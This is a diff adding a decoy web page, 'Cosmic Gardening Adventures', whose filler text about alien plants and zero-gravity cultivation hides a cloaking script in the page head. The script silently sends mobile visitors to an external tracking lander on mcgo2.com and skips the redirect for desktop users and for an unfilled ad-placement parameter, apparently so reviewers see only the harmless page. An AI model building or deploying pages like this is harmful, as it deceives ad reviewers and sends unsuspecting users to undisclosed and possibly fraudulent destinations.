@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Gardening Adventures</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #ff9900;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            padding: 20px;
+        }
+        section {
+            background-color: rgba(255, 255, 255, 0.7);
+            border-radius: 15px;
+            margin: 10px;
+            padding: 20px;
+            width: 30%;
+        }
+        footer {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px #ff00ff;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Gardening Adventures</h1>
+    </header>
+    <main>
+        <section>
+            <h2>Interstellar Plants</h2>
+            <img src="https://picsum.photos/300/200" alt="Random cosmic plant">
+            <p>Discover the wonders of alien flora from distant galaxies!</p>
+        </section>
+        <section>
+            <h2>Zero-Gravity Cultivation</h2>
+            <img src="https://picsum.photos/300/200" alt="Random space garden">
+            <p>Learn the secrets of growing plants in weightless environments!</p>
+        </section>
+        <section>
+            <h2>Nebula Fertilizers</h2>
+            <img src="https://picsum.photos/300/200" alt="Random nebula">
+            <p>Enhance your cosmic crops with star-dust enriched nutrients!</p>
+        </section>
+    </main>
+    <footer>
+        <a href="https://tokreward.com/privacy.html" style="color: #fff;">Privacy Policy</a>
+    </footer>
+</body>
+</html>
